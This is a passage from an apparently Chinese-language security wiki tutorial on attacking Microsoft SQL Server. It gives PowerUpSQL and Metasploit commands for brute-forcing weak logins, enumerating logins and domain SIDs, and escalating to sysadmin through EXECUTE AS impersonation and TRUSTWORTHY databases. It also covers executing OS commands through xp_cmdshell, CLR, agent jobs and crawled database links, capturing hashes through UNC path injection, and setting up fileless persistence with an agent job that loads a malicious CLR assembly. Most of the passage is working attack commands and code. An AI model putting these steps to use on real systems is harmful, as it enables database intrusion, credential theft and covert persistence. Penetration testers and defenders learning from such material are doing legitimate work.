//从未经身份验证的用户角度发起攻击。</span><br><span class="line">Get-SQLInstanceDomain | Invoke-SQLAuditWeakLoginPw //从域用户角度开始攻击。</span><br><span class="line">Get-SQLInstanceScanUDP | Get-SQLConnectionTestThreaded -Username &lt;USERNAME&gt; -Password &lt;PASSWORD&gt; //手动连接到已标识的SQL Server实例。</span><br></pre></td></tr></table></figure><p>许多使用SQL Server Express作为后端的应用程序都是使用特定的凭据和实例名称配置的。使用以下命令检查这些凭据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 //加载模块。</span><br><span class="line">Get-SQLInstanceDomain | Invoke-SQLAuditDefaultLoginPw</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw</span><br></pre></td></tr></table></figure><p>如果与SQL Server的通信未加密，我们可以执行MITM攻击来注入们自己的查询。根据欺骗的用户特权，我们可以注入SQL登录名。</p><ul><li><a href="https://gist.github.com/anonymous/edb02df90942dc4df0e41f3cbb78660b">sqlmitm.py</a></li></ul><h4 id="使用本地或域用户账号"><a href="#使用本地或域用户账号" class="headerlink" title="使用本地或域用户账号"></a>使用本地或域用户账号</h4><p>尝试使用当前帐户登录到SQL Server。过多的登录特权是常见的配置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUpSQL.psd1</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLConnectionTest</span><br><span class="line">Get-SQLInstanceLocal | Get-SQLConnectionTest</span><br></pre></td></tr></table></figure><h4 id="从Public到Sysadmin"><a href="#从Public到Sysadmin" class="headerlink" title="从Public到Sysadmin"></a>从Public到Sysadmin</h4><p>猜测弱密码获得高权限角色账号，一般需要以下两步：</p><ul><li>枚举登录名</li><li>猜测密码</li></ul><p><strong>1.枚举登录名</strong></p><p>默认情况下，Public角色成员不能选择本地列表登录，但可以进行Fuzz登录名。如果尝试枚举所有SQL Server登录名枚举，则只会看到其中一部分。查询出所有SQL Server登录名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM sys.syslogins</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM sys.server_principals</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-3.png"></p><p>suser_name返回给定主体ID的主体名称。可以通过使用Public角色，在suser_name函数中枚举主体ID值来标识SQL登录名。查询示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_NAME(1)</span><br><span class="line">SELECT SUSER_NAME(2)</span><br><span class="line">SELECT SUSER_NAME(3)</span><br><span class="line">SELECT SUSER_NAME(4)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-4.png"></p><p><strong>2.猜测密码</strong></p><p>使用PowerUpSQL尝试对那些已识别出的的SQL Server登录名使用弱口令爆破。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLFuzzServerLogin -Instance ComputerNAme\InstanceName  //PowerUpSQL Blind SQL登录枚举</span><br><span class="line">Invoke-SQLAuditWeakLoginPw  </span><br></pre></td></tr></table></figure><p><strong>3.获取当前域内用户名</strong></p><p>public角色可以获取当前域信息，有利用盲猜域内其他组SID或用户名。</p><p>获取SQL Server所在的域：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DEFAULT_DOMAIN() as mydomain</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-5.png"></p><p>获取域内用户的完整SID。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_SID(&#x27;&lt;Identified_Domain&gt;\Domain Admins&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-8.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x010500000000000515000000CAAE870FA5F89ACD856A619851040000</span><br></pre></td></tr></table></figure><p>获取域内Admins组的完整RID。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_SID(&#x27;&lt;Identified_Domain&gt;\Domain Admins&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-6.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x010500000000000515000000CAAE870FA5F89ACD856A619800020000</span><br></pre></td></tr></table></figure><p>抓取完整RID的前48个字节以获取域的SID。通过将十六进制数字值附加到先前的SID来创建新的RID（将与域对象相关联）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RID=0x010500000000000515000000CAAE870FA5F89ACD856A619851040000</span><br><span class="line">SELECT SUSER_NAME(RID)  //获取与RID关联的域对象名称。</span><br></pre></td></tr></table></figure><p>PowerUpSQL也可盲猜域帐户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLFuzzDomainAccount -Instance ComputerNAme\InstanceName</span><br></pre></td></tr></table></figure><h4 id="利用Public获得更多权限"><a href="#利用Public获得更多权限" class="headerlink" title="利用Public获得更多权限"></a>利用Public获得更多权限</h4><p>在具有对SQL Server的Public权限账号的上下文中，最常用的获取执行权限的方法是：</p><ul><li>特权模拟</li><li>存储过程和触发器创建/注入</li><li>写入存储过程的自动执行</li><li>SQL Server代理任务</li><li>xp_cmdshell</li><li>创建数据库链接到文件或服务器</li><li>导入/安装自定义CLR程序集</li><li>临时查询</li><li>共享服务帐户</li><li>数据库链接</li><li>UNC路径注入</li><li>Python/R脚本执行。</li></ul><p>以上大部分内容在SQL Server常用攻击面已经介绍，不再赘述，下面简单介绍一下前面未提的方法。</p><p><strong>1.特权模拟</strong></p><p>SQL Server中有一个特权/权限，它允许权限较低的用户，模拟行使另一个具有更多访问权限的用户。不限制执行查询/命令，但必须将数据库配置为允许OS命令执行对象。</p><p><strong>EXECUTE AS语句</strong></p><p>默认情况下，会话在用户登录时开始，并在用户注销时结束。会话期间的所有操作都必须对该用户进行权限检查。当一个<strong>EXECUTE AS</strong>语句运行，会话的执行上下文切换到指定的登录名或用户名。上下文切换之后，将针对该帐户的登录名和用户安全性令牌而不是调用<strong>EXECUTE AS</strong>语句的人员检查权限。本质上，在会话或模块执行期间将模拟用户或登录帐户，或者显式还原上下文切换。</p><p>使用public角色用户testuser，手动检查是否是sa登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT SYSTEM_USER</span><br><span class="line">SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;) //检查SQL Server 登录名是否为指定服务器角色的成员。</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-9.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE AS LOGIN = &#x27;sa&#x27;  //模拟sa数据库级别，对于服务器级别，请使用EXECUTE AS USER。</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-10.png"></p><p>再次使用public角色用户testuser，手动检查目前模拟为sa登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT SYSTEM_USER</span><br><span class="line">SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-11.png"></p><p><strong>2.存储过程和触发器创建/注入</strong></p><p>开发人员的一个常见错误是将他们要使用的所有功能，将其写入存储过程中，以便能够在其他用户的上下文中执行。这些存储过程可以作为数据库的所有者（拥有所有者的EXECUTE AS）来执行，以使它可以访问其他资源。也可以在高权限用户的上下文中进行执行，并且不需要授予特权。但是，从安全的角度来看，采用此方法有一些缺点：</p><ul><li>无法精细控制数据库所有者的权限。</li><li>普通帐户或sysadmin帐户通常拥有数据库。</li></ul><p>DB_OWNER角色可以使用EXECUTE AS OWNER在sa或sysadmin帐户的上下文中执行。如果这些存储过程实现不安全，则可以通过扩展存储过程来通过SQL注入或命令注入进行模拟。例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USE test2</span><br><span class="line">GO</span><br><span class="line">CREATE PROCEDURE test_imitation2</span><br><span class="line">WITH EXECUTE AS OWNER</span><br><span class="line">AS</span><br><span class="line">EXEC sp_addsrvrolemember &#x27;testuser&#x27;,&#x27;sysadmin&#x27;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p>必须将数据库配置为值得信赖的OS命令执行程序。虽然可以通过SQL或命令注入进行模拟，但是创建存储过程或触发器是更好的选择。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-12.png"></p><p>攻击场景：</p><p>DBA对Web应用程序执行以下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE LOGIN somebody WITH PASSWORD = &#x27;Password123&#x27;;  //为WebApp创建SQL登录名。</span><br><span class="line">USE test</span><br><span class="line">ALTER LOGIN [somebody] with default database = [test];</span><br><span class="line">CREATE USER somebody FROM LOGIN [somebody];</span><br><span class="line">EXEC sp_addrolemember [db_owner], [somebody];  //为此SQL登录名分配db_owner角色。Webapp可以从数据库访问所需的任何内容。</span><br><span class="line">ALTER DATABASE CurrentDB SET TRUSTWORTHY ON  //将数据库设置为可信任的访问外部资源。</span><br></pre></td></tr></table></figure><p>可以在查询中识别此类数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_NAME(owner_id) as DBOWNER, d.name as DATABASENAME FROM sys.server_principals r INNER JOIN sys.server_role_members m on r.principal_id = m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id inner join sys.databases d on suser_sname(d.owner_sid) = p.name WHERE is_trustworthy_on = 1 AND d.name NOT IN (&#x27;MSDB&#x27;) and r.type = &#x27;R&#x27; and r.name = N&#x27;sysadmin&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-13.png"></p><p>可以使用以下metasploit模块自动进行探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/admin/mssql/mssql_escalate_dbowner</span><br><span class="line">auxiliary/admin/mssql/mssql_escalate_dbowner_sqi</span><br></pre></td></tr></table></figure><p><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/">更多方法可参考NetSpi博客</a></p><p><strong>3.服务帐户</strong></p><p>SQL Server所有版本都为服务帐户提供sysadmin特权。</p><p>列出常见的一些服务帐户类型：</p><ul><li>域用户</li><li>本地用户</li><li>本地系统</li><li>网络服务</li><li>本地托管服务帐户</li><li>域托管服务帐户</li></ul><p>PowerUpSQL的Invoke-SQLOSCMD可用于基本命令执行。</p><p>对于单个主机实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SQLOSCMD –Verbose –Instance &quot;server1\instance1&quot; –Command &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p>对于域内实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceDomain | InvokeSQLOSCMD –Verbose –Command &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p>如果我们攻击了一个SQL Server，那么我们也将使用该共享帐户来攻击所有SQL Server。</p><p><strong>4.爬数据库链接</strong></p><p>数据库链接（Database Link）本质上是两个服务器之间的持久连接。数据库链接（Database Link）的作用是，允许一个数据库服务器去对其他的数据库服务器进行查询。数据链接可以用不同的方式进行配置，但是更多时候我们看到它们使用硬编码的凭据。</p><p>Public角色使用openquery()函数，对被链接的数据库服务器进行查询；也可以执行xp_cmdshell，对远程访问也无凭证要求。通常配置此功能会使数据库服务器，拥有过多的特权。因此允许在远程服务器上的模拟登录，切换到高权限账号的上下文中。下图简单说明当数据库对链接查询功能配置过高特权时，注入的payload是如何被传递：</p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/权限提升-150.png" style="zoom:100%;"><p>列出所有链接的服务器名，通常有两个选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_linkedservers</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT srvname FROM master..syservers</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-14.png"></p><p>查询一个服务器的所有链接的服务器名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT srvnaem From openquery(DB1, &#x27;select srvname FROM master..sysservers&#x27;)</span><br></pre></td></tr></table></figure><p>查询一个服务器的某个链接的服务器所链接的服务器名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT srvnaem From openquery(DB1, &#x27;select srvname FROM openquery(HVA, &quot;SELECT srvname FROM master..syservers&quot;)&#x27;)</span><br></pre></td></tr></table></figure><p>查询可以一直嵌套执行，直到穷尽所有数据库服务器。在链接的服务器上执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM openquery(DB1, &#x27;SELECT * FROM openquery(HVA, &quot;SELECT 1; exec xp_cmdshell&#x27;&quot;&#x27;ping 192.168.1.1&quot;&quot; &#x27;&#x27;)&#x27;)</span><br></pre></td></tr></table></figure><p>SQL Server 2005 存在链接爬网命令执行漏洞，使用msf的mssql_linkcrawler模块可获得反弹shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mssql/mssql_linkcrawler</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-msf-exploit.png"></p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-shell.png"></p><p>自动化爬网的工具：</p><ul><li><a href="https://www.rapid7.com/db/modules/exploit/windows/mssql/mssql_linkcrawler">mssql_linkcrawler</a></li><li><a href="https://blog.netspi.com/sql-server-link-crawling-PowerUpSQL-">PowerUpSQL</a></li><li>……</li></ul><h4 id="从系统管理员到Sysadmin"><a href="#从系统管理员到Sysadmin" class="headerlink" title="从系统管理员到Sysadmin"></a>从系统管理员到Sysadmin</h4><p>首先先了解三个点：</p><ul><li>SQL Server较旧的版本为本地管理员提供sysadmin特权</li><li>SQL Server较旧的版本为本地系统提供sysadmin特权</li><li>SQL Server所有版本都为SQL Server服务帐户提供sysadmin特权</li></ul><p>以下是利用点和常用工具列表：</p><table><thead><tr><th>利用点</th><th>常用工具</th></tr></thead><tbody><tr><td>本地管理员身份访问DB</td><td>Management Studio，sqlcmd和其他SQL客户端工具。</td></tr><tr><td>本地系统身份访问DB</td><td>Psexec，可访问性选项，带有本机SQL客户端工具的调试器。</td></tr><tr><td>通过LSA Secrets恢复服务帐户密码</td><td>Mimikatz, Metasploit, lsadump.</td></tr><tr><td>SQL Server服务进程注入</td><td>Metasploit, Python, Powershell （LoadLibrary，CreateRemoteThread等类似的功能）</td></tr><tr><td>从服务进程中窃取身份验证令牌</td><td>Metasploit, Incognito, Invoke-TokenManipulation</td></tr><tr><td>单用户模式</td><td>DBATools</td></tr></tbody></table><p>以上利用点不一定适用所有SQL Server所有版本，下面简单列出一下适用版本（√：适用，×：不适用，?：可能适用），仅供参考：</p><table><thead><tr><th>利用点</th><th>SQL Server 2000</th><th>SQL Server 2005</th><th>SQL Server 2008</th><th>SQL Server 2012</th><th>SQL Server 2014</th><th>SQL Server 2016</th></tr></thead><tbody><tr><td>服务凭证</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>本地管理员</td><td>√</td><td>√</td><td>×</td><td>×</td><td>×</td><td>×</td></tr><tr><td>本地系统</td><td>√</td><td>√</td><td>√</td><td>×</td><td>×</td><td>×</td></tr><tr><td>SQL Server进程注入</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>?</td></tr><tr><td>令牌窃取</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>?</td></tr><tr><td>单用户模式</td><td>?</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><p>附PowerUpSQL一些执行命令：</p><table><thead><tr><th>描述</th><th>命令</th></tr></thead><tbody><tr><td>SQL Server帐户的域用户。 以域用户身份运行时，此功能将自动执行4件事。1.通过LDAP查询到DC的SPN来识别域上的SQL Server。2.尝试登录每个。3.使用多种方法执行UNC路径注入。4.尝试捕获关联的SQL Server服务帐户的密码哈希。</td><td>Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12</td></tr><tr><td>通过服务帐户模拟将OS管理员转换为sysadmin，然后所有PowerUpSQL命令都可以以sysadmin身份运行。</td><td>Invoke-SQLImpersonateService -Verbose -Instance MSSQLSRV04\BOSCHSQL</td></tr><tr><td>审核问题</td><td>Invoke-SQLAudit -Verbose -Instance SQLServer1</td></tr><tr><td>升级到sysadmin</td><td>Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1</td></tr><tr><td>执行OS命令：xp_cmdshell</td><td>$Targets | Invoke-SQLOSCmd -Verbose -Command “Whoami” -Threads 10</td></tr><tr><td>执行OS命令：自定义扩展存储过程</td><td>Create-SQLFileXpDll -OutFile c:\temp\test.dll -Command “echo test &gt; c:\temp\test.txt” -ExportName xp_test -Verbose<code>将test.dll放在在SQL Server服务帐户可读的共享上。</code>Get-SQLQuery -Verbose -Query “sp_addextendedproc ‘xp_test’, ‘\yourserver\yourshare\myxp.dll’”<code> </code>xp_test<code> </code>sp_dropextendedproc ‘xp_test’</td></tr><tr><td>执行OS命令：CLR</td><td>$Targets | Invoke-SQLOSCLR -Verbose -Command “Whoami”</td></tr><tr><td>执行OS命令：Ole自动化过程</td><td>$Targets | Invoke-SQLOSOle -Verbose -Command “Whoami”</td></tr><tr><td>执行OS命令：外部脚本-R</td><td>$Targets | Invoke-SQLOSR -Verbose -Command “Whoami”</td></tr><tr><td>执行OS命令：外部脚本-Python</td><td>$Targets | Invoke-SQLOSPython -Verbose -Command “Whoami”</td></tr><tr><td>执行OS命令：代理作业-CmdExec</td><td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command “echo hello &gt; c:\windows\temp\test1.txt”</td></tr><tr><td>执行OS命令：代理作业-PowerShell</td><td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command ‘write-output “hello world” | out-file c:\windows\temp\test2.txt’ -Sleep 20</td></tr><tr><td>执行OS命令：代理作业-VBScript</td><td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command ‘c:\windows\system32\cmd.exe /c echo hello &gt; c:\windows\temp\test3.txt’</td></tr><tr><td>执行OS命令：代理作业-JScript</td><td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command ‘c:\windows\system32\cmd.exe /c echo hello &gt; c:\windows\temp\test3.txt’</td></tr><tr><td>检索数据库链接</td><td>Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1</td></tr><tr><td>检索数据库链接并执行查询</td><td>Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1 -Query “select name from master..sysdatabases”</td></tr><tr><td>抓取数据库链接并执行OS命令</td><td>Get-SQLCrawl -instance “SQLSERVER1\Instance1” -Query “exec master..xp_cmdshell ‘whoami’”</td></tr><tr><td>转储代理任务的内容。通常包含密码。详细输出包括作业摘要数据。</td><td>$Results = Get-SQLAgentJob -Verbose -Instance Server1\Instance1 -Username sa -Password ‘123qweASD’</td></tr><tr><td>枚举所有SQL登录名作为最低特权用户，并测试用户名作为密码。</td><td>针对单个服务器 Invoke-SQLAuditWeakLoginPw -Verbose -Instance SQLServer1\Instance1 运行针对域SQL Server运行 $WeakPasswords = Get-SQLInstanceDomain -Verbose | Invoke-SQLAuditWeakLoginPw -Verbose<code> </code>$WeakPasswords</td></tr></tbody></table><h3 id="SQL-Server权限维持"><a href="#SQL-Server权限维持" class="headerlink" title="SQL Server权限维持"></a>SQL Server权限维持</h3><p>利用SQL Server设置权限维持方法，主要还是靠SQL Server代理作业，定期执行计划任务。为了实现无文件攻击，还利用CLR程序集功能，加载恶意DLL文件。通过这两种内置功能进行持久化，实现了在无文件落地、无其他进程的情况下，实施权限维持。</p><p>此持久化有几个前提条件：</p><ul><li>启动SQL Server代理服务</li><li>开启CLR功能</li><li>将存储.Net程序集的数据库配置为可信赖的</li></ul><p>以上均在SQL Server代理执行计划任务和SQL Server CLR相关利用详细介绍。</p><h4 id="高隐蔽性持久化"><a href="#高隐蔽性持久化" class="headerlink" title="高隐蔽性持久化"></a>高隐蔽性持久化</h4><p>连接SQL Server数据库后，创建SQL Server代理作业，定时执行SQL语句调用恶意的用户自定义存储过程或函数利用SQL语句将CLR程序集以十六进制形式加载加载进数据库，实现通过用户自定义函数调用恶意的CLR程序集。已创建的SQL Server代理作业，定期执行计划任务，调用CLR程序集，实现无文件持久化。</p><p>首先创建名为CreateWarSQLKit的存储过程（<strong>WarSQLKit</strong>相关的利用可查看第二章中SQL ServerCLR相关利用的<strong>WarSQLKit</strong>篇章）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USE msdb;</span><br><span class="line">CREATE procedure CreateWarSQLKit as</span><br><span class="line">    CREATE ASSEMBLY [WarSQLKit]</span><br><span class="line">    AUTHORIZATION [dbo]</span><br><span class="line">    FROM 0x4D5A......</span><br><span class="line">    WITH PERMISSION_SET = UNSAFE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-1.png"></p><p>创建SQL Server代理作业，定期执行CreateWarSQLKit，实现WarSQLKit的DLL文件持久化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">USE msdb;</span><br><span class="line">EXEC dbo.sp_add_job @job_name = N&#x27;test_CreateWarSQLKit_job1&#x27;; </span><br><span class="line">EXEC sp_add_jobstep </span><br><span class="line">@job_name = N&#x27;test_CreateWarSQLKit_job1&#x27;, </span><br><span class="line">@step_name = N&#x27;test_CreateWarSQLKit_name1&#x27;,</span><br><span class="line">@subsystem = N&#x27;TSQL&#x27;,</span><br><span class="line">@command = N&#x27;exec CreateWarSQLKit&#x27;, </span><br><span class="line">@retry_attempts = 5, </span><br><span class="line">@retry_interval = 5 ;</span><br><span class="line">EXEC dbo.sp_add_jobserver @job_name = N&#x27;test_CreateWarSQLKit_job1&#x27;;</span><br><span class="line">EXEC dbo.sp_start_job N&#x27;test_CreateWarSQLKit_job1&#x27;;</span><br></pre></td></tr></table></figure><p><img 